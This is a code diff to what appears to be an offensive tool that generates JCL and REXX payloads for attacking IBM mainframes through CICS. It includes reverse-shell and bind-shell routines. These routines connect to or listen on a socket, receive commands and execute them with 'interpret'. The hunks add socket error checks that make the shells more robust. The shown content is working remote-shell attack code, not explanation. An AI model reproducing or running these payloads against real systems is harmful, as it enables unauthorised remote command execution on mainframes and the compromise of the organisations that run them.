@@ -1509,6 +1509,7 @@ def reverse_jcl(lhost, username="CICSUSEC", kind="tso"):
     g_cmd = get_cmd(s);parse = exec_cmd(s,g_cmd);end;exit
  get_cmd:
  parse arg ss; sox = SOCKET('RECV',ss,10000);parse var sox s_rc;
+ if word(s_rc,1) <> 0 then exit;
  parse var sox s_rc s_data_len sd;cmd = DELSTR(sd, LENGTH(sd));return cmd
   INLIST: procedure
     arg sock, s; do i=1 to words(s);if words(s) = 0 then return 0
@@ -1529,7 +1530,6 @@ def reverse_jcl(lhost, username="CICSUSEC", kind="tso"):
 //SYSIN    DD  DUMMY
 /*EOF
 """
-
   return jcl_code
 
 def ftp_jcl(lhost, job_name="FTPCICS"):
@@ -1622,6 +1622,7 @@ def reverse_rexx(lhost, username="CICSUSEC"):
     t=SOCKET('CONNECT',s,'AF_INET' rp rh); c=''
     sox = SOCKET('RECV',s,10000);    
     parse var sox s_rc s_data_len s_data_text;
+    if word(s_rc,1) <> 0 then exit;
     c = DELSTR(s_data_text,LENGTH(s_data_text));
     interpret c
 /*
@@ -1672,7 +1673,8 @@ def direct_rexx(username="CICSUSEC"):
      parse var te src c_s . ;cl = c_s;te = Socket('Socketsetstatus')
      te = Socket('Setsockopt',c_s,'SOL_SOCKET','SO_ASCII','ON');END
     if readin = c_s then do;sox = SOCKET('RECV',c_s,10000);
-    parse var sox s_rc s_data_len sd;cmd=DELSTR(sd,LENGTH(sd));
+    parse var sox s_rc s_data_len sd; if word(s_rc,1) <> 0 then exit;
+    cmd=DELSTR(sd,LENGTH(sd));
     interpret cmd;end;end;exit;
  INLIST: procedure
  arg sock, s; do i=1 to words(s);if words(s) = 0 then return 0
@@ -1736,6 +1738,7 @@ def direct_jcl(port, job_name="PGMTEST", kind="tso"):
      parse = exec_cmd(c_s,cmd_g);end;end;exit
  get_cmd:
   parse arg ss; sox = SOCKET('RECV',ss,10000);parse var sox s_rc;
+  if word(s_rc,1) <> 0 then exit;
   parse var sox s_rc s_data_len sd;cmd = DELSTR(sd, LENGTH(sd));return cmd
  INLIST: procedure
   arg sock, s; do i=1 to words(s);if words(s) = 0 then return 0
